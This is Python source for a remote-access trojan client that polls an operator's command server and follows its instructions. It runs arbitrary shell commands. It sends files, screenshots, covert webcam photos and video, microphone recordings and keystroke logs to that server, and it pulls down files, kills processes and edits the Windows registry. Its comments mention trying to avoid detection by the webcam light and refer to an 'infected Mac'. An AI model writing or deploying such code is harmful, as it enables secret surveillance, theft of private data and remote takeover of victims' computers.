# coding: gb18030

import time
import os
import subprocess
import platform
import wave
from datetime import datetime
import pyaudio
import requests
import traceback
import tempfile
import socket
import cv2
import win32api
import win32con
from pynput.keyboard import Listener

if os.name == 'nt':
    from PIL import ImageGrab
else:
    import pyscreenshot as ImageGrab

import config


class Client(object):

    def __init__(self):
        self.platform = platform.system() + " " + platform.release()
        # self.uid = self.get_UID()
        self.hostname = socket.gethostname()
        # print({'platform': self.platform, 'hostname': self.hostname})
        self.keylogs = ""
        # keylogs是用于存储键盘记录的字符串
        self.flag = 0

    def server_hello(self):
        """ Ask server for instructions """
        req = requests.post(config.SERVER + '/hello',
                            json={'platform': self.platform, 'hostname': self.hostname})
        return req.text

    def send_output(self, output, command='', newlines=True):
        """ Send console output to server """
        if not isinstance(output, str):
            output = output.decode("gb18030")

        req = requests.post(config.SERVER + '/report',
                            json={'output': output + '\n', 'cmd': command})

    def runcmd(self, cmd):
        """ Runs a shell command and returns its output """
        print("command:" + cmd)
        tmp = cmd.split(' ')
        try:
            proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE)
            out, err = proc.communicate()
            output = (out + err)
            print(output)
            self.send_output(output, tmp[0])
        except Exception as exc:
            self.send_output(traceback.format_exc())


    def expand_path(self, path):
        """ Expand environment variables and metacharacters in a path """
        return os.path.expandvars(os.path.expanduser(path))


    def upload(self, file):
        """ Uploads a local file to the server """
        print("file entity path:" + file)
        try:
            if os.path.exists(file) and os.path.isfile(file):
                self.send_output("[*] Uploading %s..." % file)
                requests.post(config.SERVER + '/upload',
                              files={'uploaded': open(file, 'rb')})
            else:
                pass
                self.send_output('[!] No such file: ' + file)
        except Exception as exc:
            print(traceback.format_exc())

    def download(self, file, destination):
        """ Downloads a file the the agent host through HTTP(S) """
        try:
           # destination = self.expand_path(destination)
            self.send_output("[*] Downloading %s..." % file)
            req = requests.get(config.SERVER + '/static/' + file, stream=True)
            print(file)
            print(destination)
            destination += '\\' + file
            print(destination)
            with open(destination, 'wb') as f:
                for chunk in req.iter_content(chunk_size=8000):
                    if chunk:
                        f.write(chunk)
            self.send_output("[+] File downloaded: " + destination)
        except Exception as exc:
            print(traceback.format_exc())
            self.send_output(traceback.format_exc())

    def screenshot(self):
        """ Takes a screenshot and uploads it to the server"""
        tmp_file = tempfile.NamedTemporaryFile()
        screenshot_file = tmp_file.name + ".png"

        if os.name != 'posix':
            screenshot = ImageGrab.grab()
            tmp_file.close()
            screenshot.save(screenshot_file)
        else:
            name = tmp_file.name + ".png"
            os.system("screencapture %s" % name)

        self.upload(screenshot_file)


    def camshot(self):
        # Notice: light of usage webcam gets turned on.
        # TODO: Find way to disable led-lamp or reduce amount of time.sleep as much as possible for less detection
        cam = cv2.VideoCapture(0)
        time.sleep(3)  # wait for camera to open up, so image isn't dark (less sleeping = darker image)
        ret, frame = cam.read()
        if not ret:
            return
        tmp_file = tempfile.NamedTemporaryFile()
        camshot_file = tmp_file.name + ".png"
        tmp_file.close()
        cv2.imwrite(camshot_file, frame)
        self.upload(camshot_file)

    def cameravideo(self):
        cap = cv2.VideoCapture(0)  # 打开摄像头
        width = 1920
        height = 1080
        # Define the codec and create VideoWriter object
        # fourcc为四个字符用来表示压缩帧的codec
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        tmp_file = tempfile.NamedTemporaryFile()
        cameravideo_file = tmp_file.name + ".avi"
        out = cv2.VideoWriter(cameravideo_file, fourcc, 20.0, (width, height))
        print("Video recording...")
        start_time = datetime.now()
        while cap.isOpened():
            ret, frame = cap.read()
            if ret is True:
                if (datetime.now() - start_time).seconds == 5:  # 录制5秒结束
                    break
                frame = cv2.resize(frame, (1920, 1080))
                # write the flipped frame
                out.write(frame)
            else:
                break
            key = cv2.waitKey(1)
            if key == ord("q"):
                break
        # Release everything if job is finished
        cap.release()
        out.release()
        cv2.destroyAllWindows()
        print("Video created...")
        self.upload(cameravideo_file)

    def audiocatch(self):
        """开启客户端主机麦克风,录制 10 秒音频,保存为output.wav,再upload"""
        chunk = 1024  # Record in chunks of 1024 samples 数据流块
        sample_format = pyaudio.paInt16  # 16 bits per sample 量化位数
        channels = 2  # 声道数：双声道
        fs = 44100  # 一秒钟内对声音信号的采集次数 采样率
        seconds = 10  # 录制秒数 这里录制 10 秒
        tmp_file = tempfile.NamedTemporaryFile()
        audiocatch_file = tmp_file.name + ".wav"
        audioFilename = audiocatch_file
        p = pyaudio.PyAudio()  # 实例化
        print('Recording...')

        stream = p.open(format=sample_format,
                        channels=channels,
                        rate=fs,
                        frames_per_buffer=chunk,
                        input=True)
        frames = []  # 列表用于存储 frames
        # Store data in chunks for 10 seconds
        for i in range(0, int(fs / chunk * seconds)):
            data = stream.read(chunk)  # 读取chunk个字节，放在data中
            frames.append(data)  # 列表添加中 添加 data
        # Stop and close the stream
        stream.stop_stream()
        stream.close()
        # Terminate the PortAudio interface
        p.terminate()

        print('Finished recording...')
        # Save the recorded data as a WAV file
        wf = wave.open(audioFilename, 'wb')
        # 依次配置相关参数
        wf.setnchannels(channels)
        wf.setsampwidth(p.get_sample_size(sample_format))
        wf.setframerate(fs)
        wf.writeframes(b''.join(frames))  # 转化为二进制写入文件
        wf.close()

        self.upload(audioFilename)

    def keyboardlog(self):

        tmp_file = tempfile.NamedTemporaryFile()
        audiocatch_file = tmp_file.name + ".txt"
        file_name = audiocatch_file
        fobj = open(file_name, 'w')
        start_time = datetime.now()  # 开始时间
        def on_press(key):
            self.keylogs += str(key) + " "
            #print(self.keylogs)
            if (datetime.now() - start_time).seconds > 5:  # 记录7秒结束
                fobj.write(self.keylogs)
                fobj.close()
                self.flag += 1
                if self.flag == 1:
                    self.upload(file_name)
                os.kill()
                return

        with Listener(on_press=on_press, suppress=False) as listener:
            if (datetime.now() - start_time).seconds < 5 :
                listener.join()
            else:
                if fobj.isopen():
                    fobj.write(self.keylogs)
                    fobj.close()
                    self.keylogs = ""
                    return
                else:
                    return

    def show_proc(self):
        return self.runcmd('tasklist')

    def create_proc(self, cmd):
        return self.runcmd(cmd)

    def kill_proc(self, pid):
        return self.runcmd("taskkill /f /PID " + pid)

    def startkeylogger(self):
        "Starts logging every key pressed"
        def on_press(key):
            self.keylogs += str(key) + " "

        with Listener(on_press=on_press) as listener:
            listener.join()

    def getloggedkeys(self):
        self.send_output(self.keylogs)
        self.keylogs = ""
        if platform.system() == "Darwin":
            self.send_output("Keylogger on infected Mac currenly not supported")

    def add_reg(self):
        # 打开Software目录，默认把注册表建在此处
        key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, 'SOFTWARE', 0, win32con.KEY_ALL_ACCESS)
        # 查询key下的子项个数
        size = win32api.RegQueryInfoKey(key)[0]
        # 遍历子项，查看是否存在已经添加的项，例如我们添加的是test
        result = False

        for i in range(size):
            # 若不进行try操作，如果test不存在的话会有异常
            try:
                if win32api.RegEnumKey(key, i) != 'test':
                    continue
                else:
                    result = True
                    break
            except:
                continue
        # 如果存在读出数据
        if (~result):
            # 新建test子项
            win32api.RegCreateKey(key, 'test')
            # 给其赋值
            win32api.RegSetValue(key, 'test', win32con.REG_SZ, 'G11-注册表管理')
            self.send_output("test items has been estabilished in HKEY_CURRENT_USER/SOFTWARE")
            # 关闭注册表
            win32api.RegCloseKey(key)
        else:
            # 打开test目录，取出其默认值
            keywx = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, 'Software\\test', 0, win32con.KEY_ALL_ACCESS)
            info = win32api.RegQueryValue(keywx, '')
            print(type(info))
            self.send_output(info)
            # 关闭注册表
            win32api.RegCloseKey(keywx)

    def delete_reg(self):
        key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, 'Software', 0, win32con.KEY_READ)
        # 删除子项“test”
        win32api.RegDeleteKey(key, 'test')
        win32api.RegCloseKey(key)
        self.send_output('Delete Reg HKEY_CURRENT_USER/SOFTWARE/test Succeed!!!\n')

    def ie_reg_modify(self):
        # 将“HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Internet Explorer”的默认值设为python
        key = win32api.RegOpenKey(win32con.HKEY_LOCAL_MACHINE,
                                  "SOFTWARE\\Microsoft\\Internet Explorer", 0, win32con.KEY_ALL_ACCESS)
        win32api.RegSetValue(key, '', win32con.REG_SZ, 'python')
        # 将其“Version”设置为7.0.2900.2180
        win32api.RegSetValueEx(key, 'Version', 0, win32con.REG_SZ, '7.0.2900.2180')
        win32api.RegCloseKey(key)
        self.send_output('IE Reg Modifly Succeed!!!\n')

    def disp_reg(self): #打印出所有子项的名称
        reg_root = win32con.HKEY_CURRENT_USER
        reg_path = r'console'
        reg_flags = win32con.WRITE_OWNER | win32con.KEY_WOW64_64KEY | win32con.KEY_ALL_ACCESS

        key = win32api.RegOpenKeyEx(reg_root, reg_path, 0, reg_flags)
        tmp = reg_path + "有子项" + str((win32api.RegQueryInfoKey(key))[0]) + "个"
        self.send_output(tmp)

        for item in win32api.RegEnumKeyEx(key):
            # print(item)
            self.send_output(str(item))

    def handle_enter(self, args):
        filename = args[0]
        self.runcmd('dir '+ filename)



    def run(self):
        """ Main loop """
        while True:
            try:
                time.sleep(1)
                todo = self.server_hello()
                # Something to do ?
                if todo != "":
                    #print(todo)
                    commandline = todo
                    self.send_output('$ ' + commandline + '\n')
                    split_cmd = commandline.split(" ")
                    command = split_cmd[0]
                    args = []
                    if len(split_cmd) > 1:
                        args = split_cmd[1:]
                    print("command:"+command)
                    for ch in command:
                        print('%x ' % ord(ch), end='')
                    if command == 'upload':     # 上传文件
                        self.upload(args[0])
                    elif command == 'download': # 下载文件
                        print(args)
                        self.download(args[0], args[1])
                    elif command == 'screenshot': # 屏幕截图
                        self.screenshot()
                    elif command == 'camshot':  # 摄像头拍照
                        self.camshot()
                    elif command == 'cam_video':    # 摄像头录像
                        self.cameravideo()
                    elif command == 'show_proc':    # 打印被控端当前进程表
                        print("in")
                        self.show_proc()
                    elif command == 'create_proc':  # 在被控端打开进程calc
                        self.create_proc("calc")
                    elif command == 'kill_proc':  # 在被控端打开进程calc
                        self.kill_proc(args[0])
                    elif command =='audiocatch':    # 获取音频
                        self.audiocatch()
                    elif command == 'keylogger':    # 获键盘记录
                        self.keyboardlog()
                    elif command == 'add_reg':  # 向指定位置添加注册表项
                        self.add_reg()
                    elif command == 'ie_reg_modify':    # 修改IE浏览器注册表项
                        self.ie_reg_modify()
                    elif command == 'delete_reg':   # 删除指定位置注册表项
                        self.delete_reg()
                    elif command == 'disp_reg': # 打印某一位置所有子项
                        self.disp_reg()
                    elif command == 'cd':   # 进入上层目录
                        self.runcmd("dir ..")
                    elif command == 'enter':  # 进入上层目录
                        self.handle_enter(args)
                    else:                   # 其他指令执行
                        self.runcmd(commandline)
                else:
                    pass
            except Exception as exc:
                print(traceback.format_exc())

def main():
    agent = Client()
    agent.run()


if __name__ == "__main__":
    main()
